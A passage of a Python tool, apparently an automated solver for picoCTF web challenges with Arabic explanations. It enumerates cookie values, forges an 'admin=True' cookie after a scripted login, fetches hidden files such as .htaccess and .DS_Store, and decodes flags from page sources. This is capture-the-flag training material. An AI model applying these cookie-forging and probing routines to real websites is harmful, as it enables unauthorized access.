    opts = opts or {}
    res = _base_result(origin, title, slug, recognized=True)
    res["steps"] = steps
    res["discovered"] = {"resources_checked": [], "challenge_slug": slug}
    resources = [(origin, recon["html"])]
    res["explanation_ar"].append("تعرّف صقر على اسم التحدي من النص الذي أدخلته، ثم يفحص الصفحة وملفات CSS/JavaScript المرتبطة بها فقط.")
    # Certain legacy tasks explicitly teach discovery of these conventional files.
    extra_paths = []
    if slug == "robots":
        extra_paths = ["/robots.txt"]
    elif slug == "scavenger-hunt":
        extra_paths = ["/robots.txt"]
    queue = _page_resources(recon["html"], origin)
    visited = set()
    while queue and len(visited) < 16:
        u = queue.pop(0)
        if u in visited:
            continue
        visited.add(u)
        try:
            rr = client.request("GET", u, max_body=MAX_BODY)
            record(rr, ["قراءة مورد CSS/JavaScript مرتبط في HTML."])
            resources.append((u, rr["body"]))
            res["discovered"]["resources_checked"].append(urlsplit(u).path)
        except (OSError, http.client.HTTPException, ValueError):
            continue

    if slug == "webdecode":
        # The challenge clue directs students to inspect linked pages too.
        # Follow only same-origin HTML links present in the fetched page.
        linked_pages = []
        for attrs, _inner in _ANCHOR_RE.findall(recon["html"]):
            href = _HREF_RE.search(attrs)
            if not href:
                continue
            u = urljoin(origin, html_lib.unescape(href.group(1)))
            p, b = urlsplit(u), urlsplit(origin)
            if (p.scheme, p.netloc) == (b.scheme, b.netloc) and p.path.lower().endswith((".html", ".htm")) and u not in linked_pages:
                linked_pages.append(u)
        for u in linked_pages[:8]:
            if u in visited:
                continue
            try:
                rr = client.request("GET", u, max_body=MAX_BODY)
                record(rr, ["اتباع رابط صفحة HTML ظاهر في الصفحة؛ تلميح WebDecode يطلب فحص الصفحات المرتبطة."])
                resources.append((u, rr["body"]))
                res["discovered"]["resources_checked"].append(urlsplit(u).path)
            except (OSError, http.client.HTTPException, ValueError):
                continue
    for path in extra_paths:
        try:
            rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
            record(rr, ["قراءة ملف اكتشاف معروف لهذا التحدي؛ لا يوجد تخمين لمسارات أخرى."])
            resources.append((path, rr["body"]))
            res["discovered"]["resources_checked"].append(path)
        except (OSError, http.client.HTTPException, ValueError):
            continue

    if slug in ("robots", "scavenger-hunt"):
        # Follow only paths literally disclosed by robots.txt. This keeps the
        # Scavenger Hunt flow clue-driven instead of probing a wordlist.
        robots_body = next((body for label, body in resources if label == "/robots.txt"), "")
        disclosed = []
        for line in robots_body.splitlines():
            m = re.match(r"\s*Disallow\s*:\s*(/\S*)", line, re.I)
            if m and m.group(1) not in disclosed:
                disclosed.append(m.group(1))
        for path in disclosed[:10]:
            if path in ("/", "/*") or any(urlsplit(u).path == path for u, _ in resources if str(u).startswith("http")):
                continue
            try:
                rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
                record(rr, ["اتباع المسار الذي كشفه robots.txt في نص التحدي."])
                resources.append((path, rr["body"]))
                res["discovered"]["resources_checked"].append(path)
            except (OSError, http.client.HTTPException, ValueError):
                continue

    if slug == "scavenger-hunt":
        # Let the challenge's own wording disclose the two special files.
        clue_text = "\n".join(body for _label, body in resources)
        disclosed_special = []
        if re.search(r"apache.{0,160}\baccess\b|\baccess\b.{0,160}apache", clue_text, re.I | re.S):
            disclosed_special.append(("/.htaccess", "اتباع قرينة Apache وكلمة Access الواردة في الملفات المكتشفة."))
        for path, note in disclosed_special:
            try:
                rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
                record(rr, [note])
                resources.append((path, rr["body"]))
                res["discovered"]["resources_checked"].append(path)
            except (OSError, http.client.HTTPException, ValueError):
                continue
        clue_text = "\n".join(body for _label, body in resources).lower()
        if "mac" in clue_text and "store" in clue_text:
            path = "/.DS_Store"
            try:
                rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
                record(rr, ["اتباع قرينة Mac وStore التي ظهرت في .htaccess."])
                resources.append((path, rr["body"]))
                res["discovered"]["resources_checked"].append(path)
            except (OSError, http.client.HTTPException, ValueError):
                pass

    if slug == "cookies-2021":
        # This challenge explicitly maps the `name` cookie to a small numbered
        # catalog. The app redirects between / and /check, so follow only its
        # same-origin GET redirects and guard against redirect loops per value.
        check_url = urljoin(origin, "/check")
        for index in range(33):
            client.cookies["name"] = str(index)
            try:
                # /check is explicitly observed in this analyzer's challenge
                # flow; start there, then follow the redirect(s) the app gives.
                current = check_url
                seen = set()
                for hop in range(3):
                    if current in seen:
                        break
                    seen.add(current)
                    rr = client.request("GET", current, max_body=MAX_BODY)
                    record(rr, [f"اختبار قيمة الكوكي الرقمية {index} في تحدي Cookies المحدد." if hop == 0 else
                                "اتباع تحويل GET معلَن داخل أصل التحدي."])
                    resources.append((f"Cookies index {index} hop {hop + 1}", rr["body"]))
                    if extract_flag([(f"candidate response {index}", rr["body"])], flag_patterns)[0]:
                        break
                    if rr["status"] not in (301, 302, 303, 307, 308) or not rr.get("location"):
                        break
                    next_url = urljoin(current, rr["location"])
                    old, new = urlsplit(current), urlsplit(next_url)
                    if (old.scheme, old.netloc) != (new.scheme, new.netloc):
                        break
                    current = next_url
                if extract_flag(resources[-3:], flag_patterns)[0]:
                    break
            except (OSError, http.client.HTTPException, ValueError):
                continue
        res["explanation_ar"].append("يتبع صقر تحويلات GET التي يرسلها الموقع بين / و/check، ويوقف تجربة القيم فور ظهور العلم أو استنفاد المجال المحدود.")

    if slug == "get-ahead":
        # Use form actions visible in the page (the two buttons both target
        # index.php in the original task). Fall back to the homepage only when
        # no HTTP form action was disclosed; never guess extra paths.
        head_targets = []
        for form in recon.get("forms", []):
            action = urljoin(origin, form.get("action") or origin)
            a, b = urlsplit(action), urlsplit(origin)
            if (a.scheme, a.netloc) == (b.scheme, b.netloc) and action not in head_targets:
                head_targets.append(action)
        if not head_targets:
            head_targets = [origin]
        for target in head_targets[:4]:
            try:
                head = client.request("HEAD", target, max_body=MAX_BODY)
                record(head, ["إرسال HEAD إلى عنوان نموذج ظاهر في الصفحة وفحص رؤوس الاستجابة."])
                header_text = "\n".join(f"{k}: {v}" for k, v in head.get("headers", []))
                resources.append((f"HEAD response headers {target}", header_text))
            except (OSError, http.client.HTTPException, ValueError):
                continue

    if slug == "logon":
        # This challenge's hint distinguishes Joe from other users: try Joe,
        # then one generic non-Joe account only when the pasted hint says his
        # password is the exception. Each attempt is tied to the discovered
        # login form and followed by the same-origin page after setting admin.
        login_form = next((f for f in recon.get("forms", [])
                           if f.get("method") == "POST" and
                           any(x.lower() in {"username", "user"} for x in f.get("fields", []))), None)
        if login_form:
            action = urljoin(origin, login_form.get("action") or "/")
            def attempt_logon(username_value: str, label: str) -> bool:
                values = {}
                for field in login_form["fields"]:
                    low = field.lower()
                    values[field] = (username_value if low in {"username", "user"} else
                                     TEST_PASSWORD if low in {"password", "pass"} else "")
                posted = client.request("POST", action, urlencode(values))
                record(posted, [f"إرسال نموذج الدخول باسم {label} وفق الحقول التي ظهرت في الصفحة."])
                resources.append((f"logon login response ({label})", posted["body"]))
                redirect_target = None
                if posted.get("location"):
                    nxt = urljoin(action, posted["location"])
                    old, new = urlsplit(action), urlsplit(nxt)
                    if (old.scheme, old.netloc) == (new.scheme, new.netloc):
                        redirect_target = nxt
                role_cookie = next((n for n in client.cookies if n.lower() in {"admin", "role", "is_admin"}), None)
                admin_cookie = role_cookie or "admin"
                client.cookies[admin_cookie] = "True"
                landing_url = redirect_target or origin
                role = _get_with_observed_redirects(
                    client, landing_url, record,
                    f"تعيين كوكي «{admin_cookie}=True» ثم فتح المسار الذي كشفه POST بعد دخول {label}.",
                    max_redirects=2)
                resources.append((f"logon landing page ({label})", role["body"]))
                resources.append((f"logon admin-cookie response ({label})", role["body"]))
                return extract_flag([(label, role["body"])], flag_patterns)[0] is not None

            try:
                found = attempt_logon("Joe", "Joe")
                hint = opts.get("challenge_text") or ""
                if not found and re.search(r"except.{0,50}joe|joe.{0,50}password", hint, re.I | re.S):
                    attempt_logon("guest", "مستخدم تجريبي غير Joe وفق التلميح")
            except (OSError, http.client.HTTPException, ValueError):
                pass

    # Cookie-based teaching challenges: decode only cookies received from this site.
    decoded_cookies = []
    if slug in ("cookie-monster", "cookies-2021"):
        if slug == "cookie-monster":
            login_form = next((f for f in recon.get("forms", [])
                               if f.get("method") == "POST" and
                               any(x.lower() in {"username", "user", "email"} for x in f.get("fields", [])) and
                               any(x.lower() in {"password", "pass"} for x in f.get("fields", []))), None)
            if login_form:
                values = {}
                for field in login_form["fields"]:
                    low = field.lower()
                    values[field] = ("falcon-student@example.invalid" if "email" in low else
                                     TEST_PASSWORD if "pass" in low else "falcon-student")
                action = urljoin(origin, login_form.get("action") or "/")
                try:
                    posted = client.request("POST", action, urlencode(values))
                    record(posted, ["إرسال بيانات اختبار غير حقيقية إلى نموذج الدخول المكتشف في Cookie Monster لفحص الكوكي المردودة."])
                    resources.append(("cookie-monster login response", posted["body"]))
                    if posted.get("location"):
                        nxt = urljoin(action, posted["location"])
                        if urlsplit(nxt).netloc == urlsplit(origin).netloc:
                            followed = client.request("GET", nxt)
                            record(followed, ["اتباع تحويل GET المعلن بعد إرسال نموذج التحدي."])
                            resources.append(("cookie-monster redirected page", followed["body"]))
                except (OSError, http.client.HTTPException, ValueError):
                    pass
        for name, value in list(client.cookies.items()):
            if not re.fullmatch(r"[A-Za-z0-9_.-]{1,40}", name):
                continue
            decoded_cookies.extend(_decode_cookie_text(value))
        resources.extend((f"cookie:{name}", value) for name, value in enumerate(decoded_cookies))
        if decoded_cookies:
            res["discovered"]["cookie_decode_layers"] = len(decoded_cookies)

    # Search direct content first, then common encoded source literals.
    flag, source = extract_flag(resources + bodies, flag_patterns)
    if not flag and slug == "dont-use-client-side":
        flag, source, segment_count = _reconstruct_client_side_flag(resources + bodies, flag_patterns)
        if flag:
            res["discovered"]["client_side_check_segments"] = segment_count
    if not flag and slug == "scavenger-hunt":
        # Scavenger Hunt embeds fragments inside explanatory sentences, not as
        # standalone comments. Read only fetched challenge resources and use
        # the explicit part numbers to restore the original order.
        ordered_parts = {}
        part_sources = {}
        first_part_rx = re.compile(
            r"\b(?:here['’]s\s+)?the\s+first\s+part\s+of\s+the\s+flag\s*:\s*([A-Za-z0-9_{}]+)", re.I)
        numbered_part_rx = re.compile(r"\bpart\s*(\d+)\s*:\s*([A-Za-z0-9_{}]+)", re.I)
        for label, body in resources:
            text = html_lib.unescape(body)
            for match in first_part_rx.finditer(text):
                ordered_parts[1] = match.group(1)
                part_sources[1] = label
            for match in numbered_part_rx.finditer(text):
                number = int(match.group(1))
                if 1 < number < 16:
                    ordered_parts[number] = match.group(2)
                    part_sources[number] = label
        if len(ordered_parts) >= 2 and 1 in ordered_parts:
            last_part = max(ordered_parts)
            if all(number in ordered_parts for number in range(1, last_part + 1)):
                joined = "".join(ordered_parts[number] for number in range(1, last_part + 1))
                flag, source = extract_flag([("Scavenger Hunt ordered parts", joined)], flag_patterns)
                if flag:
                    res["discovered"]["flag_fragment_sources"] = [part_sources[n] for n in range(1, last_part + 1)]

    if not flag and slug in ("insp3ct0r", "includes"):
        # Multi-part picoCTF flags are deliberately placed in source comments.
        # Join only flag-shaped comment payloads, never whole CSS/JS documents
        # (which can turn a selector or function body into a false flag).
        comment_parts = []
        if slug == "insp3ct0r":
            # Insp3ct0r labels each source comment with "1/3 of the flag",
            # "2/3 ...", and "3/3 ...". Extract those labeled fragments
            # instead of treating the whole explanatory comment as a token.
            numbered_fragments = {}
            fragment_sources = {}
            marker_rx = re.compile(
                r"\b([1-3])\s*/\s*3\s+of\s+the\s+flag\s*[:=]\s*([^\s<>\"']+)", re.I)
            for label, body in resources:
                for match in marker_rx.finditer(html_lib.unescape(body)):
                    number = int(match.group(1))
                    fragment = match.group(2).rstrip(",.;")
                    if fragment:
                        numbered_fragments[number] = fragment
                        fragment_sources[number] = label
            if all(number in numbered_fragments for number in (1, 2, 3)):
                joined = "".join(numbered_fragments[number] for number in (1, 2, 3))
                flag, source = extract_flag([("Insp3ct0r ordered comment fragments", joined)], flag_patterns)
                if flag:
                    res["discovered"]["flag_fragment_sources"] = [fragment_sources[n] for n in (1, 2, 3)]
        for label, body in resources:
            comments = [m.group(1) for m in _COMMENT_RE.finditer(body)]
            comments.extend(m.group(1) for m in re.finditer(r"/\*(.*?)\*/", body, re.S))
            comments.extend(m.group(1) for m in re.finditer(r"//([^\r\n]*)", body))
            for comment in comments:
                part = html_lib.unescape(comment).strip()
                if len(part) >= 8 and re.fullmatch(r"[A-Za-z0-9_{}]+", part) and ("_" in part or "{" in part):
                    comment_parts.append((label, part))
        if not flag:
            joined = "".join(part for _, part in comment_parts)
            flag, source = extract_flag([(f"{slug} comment fragments", joined)], flag_patterns)
            if flag:
                res["discovered"]["flag_fragment_sources"] = [label for label, _ in comment_parts]
    if not flag and slug == "webdecode":
        import base64
        encoded_candidates = re.findall(r"(?<![A-Za-z0-9+/=_-])([A-Za-z0-9_+/=-]{20,4096})(?![A-Za-z0-9+/=_-])",
                                        "\n".join(body for _, body in resources))
        for candidate in encoded_candidates[:64]:
            try:
                decoded = base64.urlsafe_b64decode(candidate + "=" * ((4-len(candidate)%4)%4)).decode("utf-8", "ignore")
            except Exception:
                continue
            flag, source = extract_flag([(f"WebDecode base64 candidate", decoded)], flag_patterns)
            if flag:
                break
    if not flag and slug == "bookmarklet":
        joined = "\n".join(body for _, body in resources)
        encrypted = re.search(r"encryptedFlag\s*=\s*['\"]([^'\"]{8,4096})['\"]", joined, re.I)
        key_literal = re.search(r"(?:key|password)\s*=\s*['\"]([^'\"]{1,64})['\"]", joined, re.I)
        if encrypted and key_literal:
            key = key_literal.group(1)
            plain = "".join(chr((ord(ch) - ord(key[i % len(key)]) + 256) % 256)
                            for i, ch in enumerate(encrypted.group(1)))
            flag, source = extract_flag([( "bookmarklet decoded locally", plain)], flag_patterns)
        # picoCTF's bookmarklet stores byte values encrypted by subtracting a
        # repeating key. Decode only a literal array and key found in page source.
        arr = re.search(r"\[\s*((?:\d{1,3}\s*,\s*){8,}\d{1,3})\s*\]", joined)
        key = re.search(r"(?:key|password)\s*[:=]\s*['\"]([^'\"]{1,64})['\"]", joined, re.I)
        if not flag and arr and key:
            try:
                nums = [int(x) for x in re.findall(r"\d+", arr.group(1))]
                plain = "".join(chr((v - ord(key.group(1)[i % len(key.group(1))])) % 256) for i, v in enumerate(nums))
                flag, source = extract_flag([( "bookmarklet decoded locally", plain)], flag_patterns)
            except Exception:
                pass

    res["discovered"]["forms"] = recon.get("forms", [])[:8]
    res["discovered"]["comments"] = [c["raw"] for c in recon.get("decoded_comments", [])][:6]
    res["explanation_ar"].append(_STATIC_GUIDANCE.get(slug, "تم جمع الأدلة من الصفحة والموارد المرتبطة؛ يوضح الشرح ما يلزم للخطوة التعليمية التالية."))
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append("عُثر على العلم في محتوى استجابة/مورد تم جلبه من أصل التحدي.")
    else:
        res["warnings"].append("لم يظهر العلم نصًا في الموارد التي فُحصت. قد يتطلب التحدي إجراءً تفاعليًا أو ملفًا مرفقًا؛ راجع النماذج والشرح.")
    return res


# --------------------------------------------------------------------------- #
#  نتيجة "غير معروف"                                                            #
# --------------------------------------------------------------------------- #
def unrecognized_result(origin, recon, steps) -> dict:
    res = _base_result(origin, "غير معروف", "none", recognized=False)
    res["steps"] = steps
    res["explanation_ar"].append("لم يتعرف صقر على نمط التحدي من أدلة الصفحة الحالية.")
    res["discovered"] = {
        "status": recon["resp"]["status"],
        "comments": [c["raw"] for c in recon["decoded_comments"]][:5],
        "decoded_comments": [c["rot13"] for c in recon["decoded_comments"]][:5],
        "emails": recon["emails"][:5],
        "forms": recon["forms"][:5],
        "login_fetch": recon["login_fetch"],
    }
    res["warnings"].append("لم يُنفَّذ أي مسار تلقائي (لا Old Sessions ولا غيره).")
    return res


# --------------------------------------------------------------------------- #
#  الموزِّع الرئيسي                                                              #
# --------------------------------------------------------------------------- #
def run_audit(url: str,
              flag_patterns: list[str] | None = None,
              timeout: int = DEFAULT_TIMEOUT,
              insecure_tls: bool = False,
              demonstrate_register_requirement: bool = False,
              username: str | None = None,
              password: str | None = None,
              email: str | None = None,
              challenge_text: str | None = None) -> dict:
    flag_patterns = flag_patterns or DEFAULT_FLAG_PATTERNS
    if not re.match(r"^https?://", url, re.I):
        url = "http://" + url
    p = urlsplit(url)
    origin = f"{p.scheme}://{p.netloc}/"

    # The No FA prompt includes downloadable app.py/users.db artifacts as
    # well as a separate running instance. Never send the database file URL
    # through the HTML reconnaissance path; explain the input mismatch first.
    named_input = detect_named_challenge(challenge_text)
    path_lower = (p.path or "").lower()
    is_artifact_url = (p.hostname or "").lower().startswith("challenge-files.") or path_lower.endswith(
        (".db", ".sqlite", ".sqlite3", ".py", ".tar.gz", ".zip"))
    if named_input and named_input[1] == "no-fa" and is_artifact_url:
        res = _base_result(origin, named_input[0], named_input[1], recognized=True)
        res["discovered"]["artifact_path"] = p.path
        res["explanation_ar"].append(
            "الرابط المدخل ملف من ملفات التحدي، وليس عنوان موقع الـInstance؛ لذلك لم يُرسل إليه طلب GET كأنه صفحة ويب.")
        res["explanation_ar"].append(
            "الصق رابط الـInstance الحي (xebec...:<port>/) لتحليل الموقع، واحتفظ برابط users.db كملف بيانات للتحليل المحلي.")
        res["warnings"].append(
            "لم يبدأ تحليل قاعدة البيانات: يلزم تنزيل users.db وقائمة كلمات المرور محليًا، ثم تشغيل مسار No FA على عنوان الـInstance.")
        return res

    opts = {
        "demonstrate_register_requirement": demonstrate_register_requirement,
        "username": username, "password": password, "email": email, "challenge_text": challenge_text,
    }

    client = HttpClient(timeout=timeout, insecure_tls=insecure_tls)
    steps: list[dict] = []
    bodies: list[tuple[str, str]] = []
    record = _make_recorder(client, steps, bodies)

    # فحص أولي
    try:
        recon = do_recon(client, origin, record)
    except (OSError, http.client.HTTPException, ValueError) as e:
        res = _base_result(origin, "غير معروف", "none", recognized=False)
        res["steps"] = steps
        res["warnings"].append(f"تعذّر الوصول إلى الهدف: {e}. تحقّق من أن رابط الـ Instance فعّال.")
        res["explanation_ar"].append("لم يكتمل الفحص الأولي.")
        return res

    # اختيار المحلل حسب الأدلة فقط
    cg = detect_crack_the_gate(recon)
    if cg:
        return solve_crack_the_gate(client, origin, recon, cg, steps, bodies, record, flag_patterns, opts)

    head_dump = detect_head_dump(recon)
    if head_dump:
        return solve_head_dump(client, origin, recon, head_dump, steps, record, flag_patterns)

    if detect_old_sessions(recon):
        return solve_old_sessions(client, origin, recon, steps, bodies, record, flag_patterns, opts)

    ssti = detect_ssti1(recon)
    if ssti:
        return solve_ssti1(client, origin, recon, ssti, steps, bodies, record, flag_patterns)

    upload = detect_n0s4n1ty(recon)
    if upload:
        return solve_n0s4n1ty(client, origin, recon, upload, steps, record, flag_patterns)

    named = detect_named_challenge(challenge_text)
    if named:
        if named[1] == "intro-to-burp":
            return solve_intro_to_burp(client, origin, recon, steps, bodies, record, flag_patterns)
        if named[1] == "local-authority":
            return solve_local_authority(client, origin, recon, steps, bodies, record, flag_patterns)
        return _known_challenge_result(client, origin, recon, named[0], named[1],
                                       steps, bodies, record, flag_patterns, opts)

    return unrecognized_result(origin, recon, steps)


# --------------------------------------------------------------------------- #
#  CLI                                                                          #
# --------------------------------------------------------------------------- #
def _main(argv: list[str]) -> int:
    if len(argv) < 2 or argv[1] in ("-h", "--help"):
        print("Usage: python web_session_audit.py <instance-url> [--json]")
        return 0
    url = argv[1]
    as_json = "--json" in argv[2:]
    try:
        result = run_audit(url)
    except (OSError, http.client.HTTPException) as e:
        print(f"[خطأ اتصال] {url}: {e}", file=sys.stderr)
        return 2

    if as_json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0 if result["success"] else 1

    print("=" * 68)
    print(f"CTF Falcon — Web Session Audit v{result['version']}")
    print(f"نوع التحدي : {result['challenge']}  (المحلل: {result['analyzer']})")
    print(f"الهدف      : {result['target']}")
    print("=" * 68)
    for s in result["steps"]:
        loc = f"  ->  {s['location']}" if s["location"] else ""
        print(f"\n[{s['n']}] {s['method']} {urlsplit(s['url']).path}  =>  {s['status']} {s['reason']}{loc}")
        for c in s["set_cookies"]:
            print(f"    Set-Cookie: {c['name']}  [{c['intent']}]")
        for note in s["notes_ar"]:
            print(f"    • {note}")
    print("\n" + "-" * 68 + "\nالشرح:")
    for line in result["explanation_ar"]:
        print("  " + line)
    if result["warnings"]:
        print("\nتحذيرات:")
        for w in result["warnings"]:
            print("  ! " + w)
    print("-" * 68)
    if result["success"]:
        print(f"\n✅ العلم: {result['flag']}   (المصدر: {result['flag_source']})\nانسخ العلم بنفسك.")
    elif not result["recognized"]:
        print("\nℹ️ لم يتعرف صقر على نمط التحدي؛ المكتشفات معروضة أعلاه.")
    else:
        print("\n❌ لم يُستخرج العلم. راجِع الأدلة أعلاه.")
    print("=" * 68)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
